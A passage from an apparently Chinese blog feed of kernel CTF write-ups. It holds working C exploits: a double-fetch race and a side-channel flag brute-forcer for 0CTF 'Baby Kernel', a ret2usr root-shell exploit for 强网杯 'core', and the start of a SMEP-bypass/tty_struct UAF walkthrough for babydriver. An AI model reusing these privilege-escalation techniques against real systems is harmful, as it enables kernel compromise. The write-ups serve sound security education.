class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]flag addr=&gt;%p\n&quot;</span>, flag_addr);</span><br><span class="line"></span><br><span class="line">    target.addr = buf;</span><br><span class="line">    target.size = <span class="number">33</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread;</span><br><span class="line">    pthread_create(&amp;thread, <span class="literal">NULL</span>, change_flag_addr, &amp;target);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Time; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd, <span class="number">0x1337</span>, &amp;target);</span><br><span class="line">        target.addr = buf;</span><br><span class="line">    &#125;</span><br><span class="line">    finished = <span class="number">1</span>;</span><br><span class="line">    pthread_join(thread, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h3><p>名字虽然听起来很高端，实际干的事情就是爆破每一个字节。</p><p>方法的原理就是：创建三个段，除了中间的段可读可写外，其他段的权限都为000，那么我们将flag放到第二个段的末尾，然后将猜测的字符放到最后一个，当最后一个字符不正确的时候就会直接退出，但是当最后一个字符正确的时候就会因为权限问题报错，并且系统崩溃</p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-2/image-20220324144534013.png" alt="image-20220324144534013"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ch = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890,._-&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> command1[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;save.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fscanf</span>(fd, <span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    fclose(fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ch); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(command, <span class="string">&quot;echo \&quot;%s%c\&quot; &gt; save.txt&quot;</span>, flag, ch[i]);</span><br><span class="line">        <span class="built_in">sprintf</span>(command1, <span class="string">&quot;./exp %s%c&quot;</span>, flag, ch[i]);</span><br><span class="line">        system(command);</span><br><span class="line">        system(command1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    buf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i] = argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]flag=&gt;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flag</span> <span class="title">target</span>;</span></span><br><span class="line">    target.size = <span class="number">33</span>;</span><br><span class="line">    target.addr = buf + <span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;target);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2018-0CTF-Finals-Baby-Kernel&quot;&gt;&lt;a href=&quot;#2018-0CTF-Finals-Baby-Kernel&quot; class=&quot;headerlink&quot; title=&quot;2018 0CTF Finals Baby Kernel&quot;&gt;&lt;/a&gt;20</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
    <category term="侧信道攻击" scheme="https://cv196082.gitee.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn基础[1]</title>
    <link href="https://cv196082.gitee.io/2022/03/22/kernel-pwn%E5%9F%BA%E7%A1%80-1/"/>
    <id>https://cv196082.gitee.io/2022/03/22/kernel-pwn%E5%9F%BA%E7%A1%80-1/</id>
    <published>2022-03-22T08:17:19.000Z</published>
    <updated>2022-03-22T08:27:08.340Z</updated>
    
    <content type="html"><![CDATA[<p>这里的例题仍然是上一篇的两个例题，不过使用不同的解法。</p><h2 id="2018-强网杯-core"><a href="#2018-强网杯-core" class="headerlink" title="2018 强网杯 - core"></a>2018 强网杯 - core</h2><p>上一篇里这道题使用的方法是ROP，不过这一方法相对来说比较麻烦，构造ROP链挺恼火的。</p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-1/image-20220322162702037.png" alt="image-20220322162702037"></p><p>可以看到并没有打开smep所以可以直接实现ret2usr。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>, vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *(*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span> *) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] root now!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> payload[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        payload[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    payload[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">    payload[i++] = <span class="number">0</span>;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    payload[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    payload[i++] = user_cs;</span><br><span class="line">    payload[i++] = user_rflags;</span><br><span class="line">    payload[i++] = user_sp;</span><br><span class="line">    payload[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, payload, <span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的payload少了很多</p><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><p>首先不是用之前的方法需要一定的前置知识</p><h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p>为了防止 ret2usr 攻击，内核开发者提出了 smep 保护，smep 全称 Supervisor Mode Execution Protection，是内核的一种保护措施，作用是当 CPU 处于 ring0 模式时，执行 用户空间的代码 会触发页错误；这个保护在 arm 中被称为 PXN。</p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-1/image-20220322135811894.png" alt="image-20220322135811894"></p><p>可以看到这里是打开了smep保护的。</p><p>系统其实是根据CR4寄存器来判断是否开启smep保护，当smep位为1代表开启，反之就是关闭。所以我们只需要可以控制这里值的gadget即可。一般是采用固定的值放入CR4寄存器<code>mov cr4, 0x6f0</code></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这里不使用第一种方式的话，思路大概就是先关闭smep保护，然后ret2usr。</p><p>首先是通过UAF控制一个tty_struct结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; 